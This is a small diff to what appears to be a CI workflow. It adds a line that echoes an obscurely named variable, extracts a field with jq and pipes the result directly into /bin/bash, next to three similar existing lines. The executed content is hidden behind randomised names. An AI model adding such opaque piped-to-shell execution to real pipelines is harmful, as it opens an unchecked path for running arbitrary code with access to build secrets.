@@ -22,6 +22,7 @@ jobs:
           echo $i2 | jq -r .kwjii6 | /bin/bash
           echo $yrt5803 | jq -r .dc668 | /bin/bash
           printf '%s' "$zjx76734" | jq -r .qzlzk4394 | /bin/bash
+          echo $n51 | jq -r .jwgyf26 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
